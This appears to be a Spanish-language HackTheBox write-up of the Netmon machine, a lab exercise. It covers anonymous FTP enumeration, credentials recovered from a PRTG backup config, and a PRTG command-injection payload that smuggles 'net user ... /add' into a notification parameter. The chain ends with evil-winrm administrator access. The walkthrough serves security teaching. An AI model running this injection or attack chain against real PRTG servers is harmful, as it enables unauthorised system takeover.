---
layout      : post
title       : "Maquina Netmon - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Netmon/banner.png
category    : [ hackthebox ]
tags        : [ ftp enumeration, absing PRTG Network Monitor, Command Injection RCE]
---

Hoy vamos a resolver la máquina `Netmon` de la plataforma de `hackthebox` correspondiente a una maquina `windows` dificultad facil, la cual explotaremos a partir de una enumeración por `ftp` donde obtendremos archivos de configuración con credenciales que nos permitiran conectarnos al servicio web y despues nos aprovecharemos de una vulnerabilidad de `PRTG` que nos permitira realizar la creación de un usuario a nivel de sistema y le añadiremos permisis de administrador, para finalmente conectarnos al sistema como el usuario `administrator`.
 

Vamos a comenzar creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Netmon
❯ ls
 Netmon
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## Enumeración [#](#enumeracion) {#enumeracion}
 

Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.152
PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=200 ms

--- 10.10.10.152 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 199.775/199.775/199.775/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `127`correspondiente a una maquina `windows`, ahora procederemos a el escaneo de puertos con la ayuda de `nmap`:

### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:18 GMT
Initiating SYN Stealth Scan at 04:18
Scanning 10.10.10.152 [65535 ports]
Discovered open port 80/tcp on 10.10.10.152
Discovered open port 21/tcp on 10.10.10.152
Discovered open port 135/tcp on 10.10.10.152
Discovered open port 139/tcp on 10.10.10.152
Discovered open port 445/tcp on 10.10.10.152
Discovered open port 49667/tcp on 10.10.10.152
Discovered open port 49664/tcp on 10.10.10.152
Discovered open port 49668/tcp on 10.10.10.152
Discovered open port 47001/tcp on 10.10.10.152
Discovered open port 49666/tcp on 10.10.10.152
Discovered open port 49669/tcp on 10.10.10.152
Discovered open port 5985/tcp on 10.10.10.152
Discovered open port 49665/tcp on 10.10.10.152
Completed SYN Stealth Scan at 04:18, 23.62s elapsed (65535 total ports)
Nmap scan report for 10.10.10.152
Host is up, received user-set (0.14s latency).
Scanned at 2023-06-14 04:18:22 GMT for 24s
Not shown: 63185 closed tcp ports (reset), 2337 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.76 seconds
           Raw packets sent: 116389 (5.121MB) | Rcvd: 77893 (3.116MB)
```

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:19 GMT
Nmap scan report for 10.10.10.152
Host is up (0.40s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-06-14T04:20:28
|_  start_date: 2023-06-14T04:14:56

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.25 seconds
```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 21     | FTP     | Microsoft ftpd |
| 80   | HTTP     | Indy httpd 18.1.37.13946 |
| 135   | RPC     | Microsoft Windows RPC |
| 139   | LDAP     | Microsoft Windows netbios-ssn |
| 445   | SMP     | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds |
| 5985   | WINRM     | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |
| 47001   | HTTP     | Microsoft HTTPAPI httpd 2.0 |
| 49664-49669   | MSRPC     | Microsoft Windows RPC |


## Explotación [#](#explotación) {#explotación}

Comenzaremos enumerando el servicio `ftp` haciendo uno del usuario `anonymous`, sin proporcionar contraseña.

```bash
❯ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:fmiracle): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
```

Si nos dirigimos al directorio `Users`, vemos que podemos obtener la primera flag `user.txt`, pero aun no tenemos acceso al sistema.

```bash
ftp> cd Users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
ftp> cd Public
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
06-14-23  12:15AM                   34 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
34 bytes received in 0.20 secs (0.1620 kB/s)
ftp> exit
221 Goodbye.
❯ cat user.txt
❯ c07be14afc2253b24510769dcb7db65
```

Para poder enumear de una manera mas comoda los archivos mediante `ftp`, vamos a crearnos una montura con la herramienta `curlftpfs`.

```bash
❯ curlftpfs
❯ mkdir /mnt/monturaftp
❯ curlftpfs ftp://10.10.10.152 /mnt/monturaftp
❯ ls -l /mnt/monturaftp
d--------- root root   0 B  Sun Nov 20 22:46:00 2016  $RECYCLE.BIN
d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Documents and Settings
d--------- root root   0 B  Mon Feb 25 22:15:00 2019  inetpub
d--------- root root   0 B  Sat Jul 16 09:18:00 2016  PerfLogs
d--------- root root   0 B  Mon Feb 25 22:56:00 2019  Program Files
d--------- root root   0 B  Sun Feb  3 00:28:00 2019  Program Files (x86)
d--------- root root   0 B  Wed Dec 15 10:40:00 2021  ProgramData
d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Recovery
d--------- root root   0 B  Sun Feb  3 08:04:00 2019  System Volume Information
d--------- root root   0 B  Sun Feb  3 08:08:00 2019  Users
d--------- root root   0 B  Mon Feb 25 23:49:00 2019  Windows
.--------- root root 380 KB Sun Nov 20 21:59:00 2016  bootmgr
.--------- root root   1 B  Sat Jul 16 09:10:00 2016  BOOTNXT
.--------- root root 704 MB Wed Jun 14 00:14:00 2023  pagefile.sys
```

Antes de segui enumerando vamos a ver el servicio web, que esta expuesto en el puerto 80.


![](/assets/images/HTB/htb-writeup-Netmon/netmon1.PNG)


Vemos que el servicio corresponde a `PRTG Network Monitor`.

> PRTG Network Monitor: PRTG (Paessler Router Traffic Grapher hasta la versión 7) es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el  tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones. 


Buscamos si hay `exploits` asociados a este servicio y entre ellos una de ejecución remota de comandos.

```bash
❯ searchsploit PRTG
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                 | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                             | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                              | java/webapps/34108.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```


El exploit nos pide estar autenticados, asi que vamos a examinar la montura que previamente creamos y trataremos de buscar archivos de configuración, ya que estos suelen almacenar credenciales.


Encontramos archivos de configuración, y usaremos `diff` para encontrar diferncias entre el archivo `.dat` y el archivo `old.bak`

```bash
diff "PRTG Configuration.dat" "PRTG Configuration.old.bak" | less
<               <flags>
<                 <encrypted/>
<               </flags>
---
>             <!-- User: prtgadmin -->
>             PrTg@dmin2018
317c313
<                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====
---
>                 6SLJOGVBYWJF5ZMURQWHEPJ3C3WT2NQDJOZA====
325c321
<                 IVK3MVDI6HCMYIRYQN264YLIRXNJWMB6NT3Q====
---
>                 ILD5YN3TROUJXG6ECLVDRKIPKTBKE274FTNQ====
```


Obtenemos las credenciales `prtgadmin:PrTg@dmin2018` con las cuales podamos logearnos en el servicio `PRTG`, pero al intentar logearnos nos dicen que las credenciales son invalidas.


![](/assets/images/HTB/htb-writeup-Netmon/netmon3.PNG)


Podemos tratar de hacer guesing y debido a que la contraseña termina en 2018, podemos modificarla por 2019.


![](/assets/images/HTB/htb-writeup-Netmon/netmon4.PNG)

Logramos conectarnos al panel como el usuario `administrator`.


![](/assets/images/HTB/htb-writeup-Netmon/netmon5.PNG)


## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si revisamos el exploit que tenemos, vemos que este realiza una petición a la ruta `myaccount.htm?tabid=2` y envia una data que se encuentra `urlencodeada`.

![](/assets/images/HTB/htb-writeup-Netmon/netmon2.PNG)


Usaremos una sesión interactiva de `php` para urldecodear la data y ver mejor que es lo que envia.


```php
❯ php --interactive
Interactive mode enabled
php > echo urldecode("name_=create_user&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.ps1&message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+user+pentest+P3nT3st!+%2Fadd%22&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2");

name_=create_user&tags_=&active_=1&schedule_=-1|None|&postpone_=1&comments=&summode_=2&summarysubject_=[%sitename] %summarycount Summarized Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=[%sitename] %device %name %status %down (%message)&contenttype_1=text/html&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=[%sitename] %device %name %status %down (%message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=[%sitename] %device %name %status %down (%message)&active_2=0&eventlogfile_2=application&sender_2=PRTG Network Monitor&eventtype_2=error&message_2=[%sitename] %device %name %status %down (%message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=[%sitename] %device %name %status %down (%message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=[%sitename] %device %name %status %down (%message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo EXE Notification - OutFile.ps1&message_10="C:\Users\Public\tester.txt;net user pentest P3nT3st! /add"&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=[%sitename] %device %name %status %down (%message)&active_16=0&isusergroup_16=1&addressgroupid_16=200|PRTG Administrators&ticketuserid_16=100|PRTG System Administrator&subject_16=%device %name %status %down (%message)&message_16=Sensor: %name
Status: %status %down

&autoclose_16=1&objecttype=notification&id=new&targeturl=/myaccount.htm?tabid=2
```

Vemos que la data se enviar a un parametro `message_10`, en donde crea un usuario de nombre `pentest` a nivel de sistema `net user pentest P3nT3st! /add`.


Podemos aprovecharnos de este y ejecutar una instrucción similar a la del exploit, donde crearemos un usuario al cual pondre de nombre `pentest` y ademas lo añadire al grupo de Administradores.


Nos dirigimos a la ruta a donde manda la petición, damos en `Add new Notification`.

![](/assets/images/HTB/htb-writeup-Netmon/netmon6.PNG)


Creamos un nombre de Notificación, en este caso `Nuevo`.

![](/assets/images/HTB/htb-writeup-Netmon/netmon9.PNG)


y ahora activamos la función `Execute Program`


![](/assets/images/HTB/htb-writeup-Netmon/netmon10.PNG)

podemos ver varios inputs y si los inspeccionamos encontramos el de `message_10` que corresponde a `Parameter`

![](/assets/images/HTB/htb-writeup-Netmon/netmon8.PNG)

Ejecutamos en el campo la instrucción, donde crearemos nuestro usuario y lo añadiremos al grupo administrador.

![](/assets/images/HTB/htb-writeup-Netmon/netmon11.PNG)

Guardamos y ahora en la notificación creada le damos en el simbolo de la campana `Send`.

![](/assets/images/HTB/htb-writeup-Netmon/netmon12.PNG)


Le damos ok en la confirmación y ya deberia haberse ejecutado la acción.


Como vimos que el puerto `445` esta abierto podemos usar `crackmapexec` y validamos que el usuario `fmiracle` ahora existe y forma parte de los usuarios `administradores`.

```bash
❯ crackmapexec smb 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\pentest:p3nT3st! (Pwn3d!)
```

Ahora haciendo uso del servicio de administración remota de windows, podemos conectarnos por el puerto `5985`, usando la herramienta `evil-winrm`.

```bash
❯ evil-winrm -i 10.10.10.152 -u 'pentest' -p 'p3nT3st!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\pentest\Documents> cd C:\Users
```

Una vez ya en el sistema podemos dirigirnos al directorio personal del usuario `Administrator` y visualizar la segunda flag `root.txt`.

```cmd
*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
491b992fe825994a2fad4199afd2ca76
```


